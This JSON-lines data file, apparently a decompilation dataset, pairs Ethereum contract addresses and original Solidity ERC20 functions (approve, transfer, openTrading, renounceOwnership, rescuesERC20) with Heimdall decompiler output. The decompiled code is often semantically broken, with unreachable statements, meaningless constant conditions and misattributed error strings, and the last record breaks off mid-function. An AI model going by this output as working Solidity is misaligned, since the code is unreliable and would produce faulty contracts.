{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_n[var_a] > (arg1 + storage_map_n[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((arg1 + storage_map_n[var_a]) < storage_map_n[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_n[var_a] = arg1 + storage_map_n[var_a];\n        uint256 var_d = arg1 + storage_map_n[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_n[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc0aC4689fe801A49Be4Ab080c0018eE0d9C3229e", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function disableTransferDelay() external onlyOwner returns (bool){\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function disableTransferDelay() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x86612Df86F83dfD8E95d71E7766E1579Bf82BCab", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_h / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_g = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_g));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_g / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_g / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_n[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_g / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x8bD394Bd4b52207Df7a12F4a3EBF089e3d632826", "original_solidity_code": "function rescuesERC20(address _address, uint256 percent) external onlyOwner {\\r\\n        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);\\r\\n        IERC20(_address).transfer(development_receiver, _amount);\\r\\n    }", "heimdall_decompiled_code": "function rescuesERC20(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require((arg1 == ((arg1 * var_e.length) / var_e.length)) | !var_e.length);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x64);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        var_h = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_c = address(store_m);\n        uint256 var_d = (arg1 * var_e.length) / 0x64;\n        (bool success, bytes memory ret0) = address(arg0).{ value: 0 ether }Unresolved_a9059cbb(var_c); // call\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!((var_e + ret0.length) - var_e) < 0x20);\n        require(var_e.length == var_e.length);\n    }"}
{"contract_address": "0x5843ACcF881D401B3AD3D749b96A308Ebb486Cef", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_k[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x9EbFcFb424f91eE2F8f143cc4430e9E1E2E80939", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x05f5e100, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_m[var_e] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x679905CAD3Da37c92fa79d88d865Fb9FF48a8B50", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB44A4AEbE8Fa44847a517Fe02d8dAf36Ab5487f5", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8b13B49531ed4412305DC0973197a8af7CE2eF07", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x989680, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_m[var_e] = 0x989680;\n        var_a = 0x989680;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x989680);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x3De5be19D4c2eA5F9c93E556383E286fe2101A96", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_h * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_s = 0x20;\n        uint256 var_t = var_i.length;\n        uint256 var_u = 0;\n        